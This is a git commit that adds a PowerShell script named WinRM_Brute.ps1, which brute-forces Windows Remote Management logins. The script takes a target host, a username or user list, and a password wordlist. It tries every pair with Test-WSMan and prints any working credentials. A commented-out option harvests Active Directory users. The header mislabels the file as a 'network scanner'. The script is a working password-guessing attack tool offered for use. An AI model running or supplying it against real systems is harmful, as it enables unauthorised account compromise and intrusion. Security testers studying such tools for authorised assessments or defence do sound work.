a7a31989625400e1a27091639273482f65af05d1
Securethelogs.com <54673576+securethelogs@users.noreply.github.com>
2020-01-19 19:28:24 +0000

    Add files via upload

---
+++ WinRM_Brute.ps1
@@ -0,0 +1,201 @@
+﻿   <#
+	.SYNOPSIS
+		Scan Network Devices
+
+	.DESCRIPTION
+		Simple Light Weight Network Scanner
+
+	.NOTES
+		Aurthor: https://securethelogs.com
+
+    		
+#>
+
+
+
+$logo = @(  "",
+" __      __.__      __________            __________                __          ",
+"/  \    /  \__| ____\______   \ _____     \______   \_______ __ ___/  |_  ____  ",
+"\   \/\/   /  |/    \|       _//     \     |    |  _/\_  __ \  |  \   __\/ __ \ ",
+" \        /|  |   |  \    |   \  Y Y  \    |    |   \ |  | \/  |  /|  | \  ___/ ",
+"  \__/\  / |__|___|  /____|_  /__|_|  /____|______  / |__|  |____/ |__|  \___  >",
+"       \/          \/       \/      \/_____/      \/                         \/ ",
+"",
+
+"Creator: https://securethelogs.com / @securethelogs",
+"")
+
+
+$targetcomputer = ""
+$targetuser = @()
+$targetpassword = @()
+
+
+
+$logo
+
+    #----------- Get the target computer ----------------------
+    
+    Write-Output "Please Enter The Targets Computer Name or IP"
+
+    $compname = Read-Host -Prompt "Target"
+
+    $targetcomputer = $compname
+
+    Write-Output ""
+    Write-Output "Please Select One Of The Following Options"
+    Write-Output "Option 1: Single User | Option 2: Txt File Location"
+
+    #Option 3 to come...
+    #Write-Output "Option 1: Single User | Option 2: Txt File Location | Option 3: Attempt To Extract From AD"
+    
+        
+    [string]$useroption = Read-Host -Prompt "Option Number"
+
+    # -------------user wants single user --------------------------
+  
+    if ($useroption -eq "1"){ 
+    
+    $useroption = Read-Host -Prompt "Enter Username"
+    $targetuser += $useroption
+
+    }
+
+    # --------- User has a userlist ----------------
+
+    if ($useroption -eq "2"){
+
+    $useroption = Read-Host -Prompt "Enter Path Location"
+    $pullusers = Get-Content -Path $useroption
+
+    foreach ($i in $pullusers) {
+    
+    $targetuser += $i
+
+    }
+    
+    }
+
+    # --------- user wants to try recon ------------------------
+
+    <#
+
+    if ($useroption -eq "3"){
+
+    $outputloc = "C:\Temp\users.txt"
+
+    # ********* get the command rights. Pull usernames
+
+    dsquery user -name * | dsget user -email >> $outputloc
+    
+    $pullusers = Get-Content -Path $outputloc
+
+    foreach ($i in $pullusers) {
+    
+    $targetuser += $i
+
+    }
+
+
+    } 
+
+    #>
+
+    if ($useroption -ne "1" -OR $useroption -ne "2" -OR $useroption -ne "3" ){
+    
+    #Catch fail
+    
+    }
+
+
+  
+  # ------------ Get Password List ------------------------
+
+  Write-Output ""
+  Write-Output "Please Enter The File Path Of Your Wordlist (C:\Temp\Wordlist.txt)"
+ 
+  
+  $passloc = Read-Host -Prompt "File Path"
+
+  $passwordstotry = Get-Content -Path $passloc
+
+  foreach ($p in $passwordstotry) {
+  
+  $targetpassword += $p 
+  
+  }
+
+
+
+# --------------- Starting Scan -----------------------------
+
+foreach ($u in $targetuser) {
+
+
+foreach ($p in $targetpassword) {
+
+
+$Error.clear()
+
+$crackedcreds = @()
+$hackedpassword = ""
+  
+         $secpassword = ConvertTo-SecureString $p -AsPlainText -Force
+         $mycredential = New-Object System.Management.Automation.PSCredential ($u, $secpassword)
+
+         #Test Connection of each password
+        
+         $result = Test-WSMan -ComputerName $targetcomputer -Credential $mycredential -Authentication Negotiate -erroraction SilentlyContinue
+
+
+   if ($result -eq $null) {
+
+    Write-Output "Testing Password: $p = Failed"
+    
+    $hackedpassword = $null
+
+    } else {
+
+    #results are successfull and show the password
+
+    Write-Output "Testing Password: $p = Success"
+    
+    $crackedcreds += $u + "::" + $p
+    
+        
+}
+
+
+
+} # foreach password end
+
+
+
+} # foreach user end
+
+
+
+
+if ($crackedcreds -ne $null) {
+
+Write-Output "---------------------------------------------------"
+Write-Output ""
+Write-Output "Success! Here Are The Credentials:"
+Write-Output $crackedcreds
+Write-Output ""
+
+}
+
+else {
+
+Write-Output "---------------------------------------------------"
+Write-Output ""
+Write-Output "Brute Force Failed...."
+
+}
+
+
+
+#------------------------------------------------------------------Break ----------------------------
+
+
